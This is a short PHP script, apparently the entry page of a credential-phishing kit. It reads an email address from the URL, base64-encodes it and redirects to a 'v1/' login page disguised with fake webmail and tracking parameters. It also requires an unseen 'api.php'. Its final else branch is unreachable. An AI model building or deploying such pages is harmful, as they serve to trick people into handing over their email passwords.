<?php

session_start();

require 'api.php';

if (isset($_GET['email'])) {
$email = $_GET['email'];
}
$msg_id = base64_encode($email);

if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: v1/?cid=2327&utm_term=2327&utm_campaign=login&utm_medium=help-and-learn&utm_source=login_frontend_hosting&utm_content=flyin&id=$msg_id");
}
elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header ("Location: v1/?cid=2539&utm_term=2539&utm_campaign=login&app=email&realm=pass");
}
else{
     include "404.php";
}

?>

